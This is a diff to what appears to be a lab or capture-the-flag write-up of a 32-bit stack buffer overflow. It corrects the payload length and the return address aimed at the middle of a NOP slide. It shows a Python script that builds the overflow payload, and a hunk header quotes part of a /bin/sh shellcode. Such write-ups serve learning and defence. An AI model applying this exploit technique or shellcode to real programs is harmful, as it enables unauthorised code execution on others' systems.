@@ -27,7 +27,7 @@ Spwan a /bin/sh session with `x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6
 
 # Payload Generation
 
-- 80 Bytes for whole payload (NOP Slide + shellcode)
+- 72 Bytes for whole payload (NOP Slide + shellcode)
 - Rest to overwrite the return pointer (after $ebp)
 
 ## Structure
@@ -39,11 +39,11 @@ Spwan a /bin/sh session with `x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6
 ```python
 # pointerTo(start of buffer) + lengthOfNOPS//2
 >>> hex(int(0xbffffc60) + 47//2)
-'0xbffffc79'
+'0xbffffc77'
 ```
-- Middle of Nop slide = `0xbffffc79`
+- Middle of Nop slide = `0xbffffc77`
 
-Hence, $eip to be overwritten to `0xbffffc79`
+Hence, $eip to be overwritten to `0xbffffc77`
 
 # Exploit
 
@@ -58,7 +58,7 @@ nop_slide = '\x90'*47
 shellcode = '\xCC'*25
 
 ebp = 'BBBB'
-eip = struct.pack("I",0xbffffc79)
+eip = struct.pack("I",0xbffffc77)
 
 payload = nop_slide + shellcode + ebp + eip
 print(payload)
